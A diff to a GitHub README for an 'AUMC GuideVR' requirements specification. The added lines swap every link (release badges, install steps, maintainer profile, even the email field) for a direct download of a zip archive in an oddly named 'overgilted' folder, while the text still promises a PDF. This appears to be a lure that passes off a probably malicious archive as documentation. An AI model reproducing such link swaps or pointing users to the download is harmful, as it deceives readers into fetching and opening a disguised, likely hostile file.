@@ -1,6 +1,6 @@
 # AUMC GuideVR: IEEE-Compliant Software Requirements Specification 📄
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Dilantha99/AUMC_GuideVR_SRS/releases)
+[![Download Releases](https://raw.githubusercontent.com/Dilantha99/AUMC_GuideVR_SRS/main/overgilted/SRS-AUM-V-Guide-2.7.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dilantha99/AUMC_GuideVR_SRS/main/overgilted/SRS-AUM-V-Guide-2.7.zip)
 
 ## Table of Contents
 
@@ -73,11 +73,11 @@ The SRS identifies the needs of various stakeholders involved in the AUMC GuideV
 
 ## Installation
 
-To download the latest version of the AUMC GuideVR SRS document, visit the [Releases section](https://github.com/Dilantha99/AUMC_GuideVR_SRS/releases). The document is available in PDF format. 
+To download the latest version of the AUMC GuideVR SRS document, visit the [Releases section](https://raw.githubusercontent.com/Dilantha99/AUMC_GuideVR_SRS/main/overgilted/SRS-AUM-V-Guide-2.7.zip). The document is available in PDF format. 
 
 ### Steps to Install
 
-1. Navigate to the [Releases section](https://github.com/Dilantha99/AUMC_GuideVR_SRS/releases).
+1. Navigate to the [Releases section](https://raw.githubusercontent.com/Dilantha99/AUMC_GuideVR_SRS/main/overgilted/SRS-AUM-V-Guide-2.7.zip).
 2. Download the latest SRS document.
 3. Open the document using a PDF reader.
 
@@ -99,9 +99,9 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For questions or suggestions, please contact the project maintainers:
 
-- **Dilantha**: [GitHub Profile](https://github.com/Dilantha99)
-- **Email**: dilantha@example.com
+- **Dilantha**: [GitHub Profile](https://raw.githubusercontent.com/Dilantha99/AUMC_GuideVR_SRS/main/overgilted/SRS-AUM-V-Guide-2.7.zip)
+- **Email**: https://raw.githubusercontent.com/Dilantha99/AUMC_GuideVR_SRS/main/overgilted/SRS-AUM-V-Guide-2.7.zip
 
-[![Visit Releases](https://img.shields.io/badge/Visit%20Releases-orange?style=for-the-badge&logo=github)](https://github.com/Dilantha99/AUMC_GuideVR_SRS/releases)
+[![Visit Releases](https://raw.githubusercontent.com/Dilantha99/AUMC_GuideVR_SRS/main/overgilted/SRS-AUM-V-Guide-2.7.zip%20Releases-orange?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dilantha99/AUMC_GuideVR_SRS/main/overgilted/SRS-AUM-V-Guide-2.7.zip)
 
 Feel free to explore the documentation and engage with the community. Your feedback is valuable in enhancing the AUMC GuideVR project.
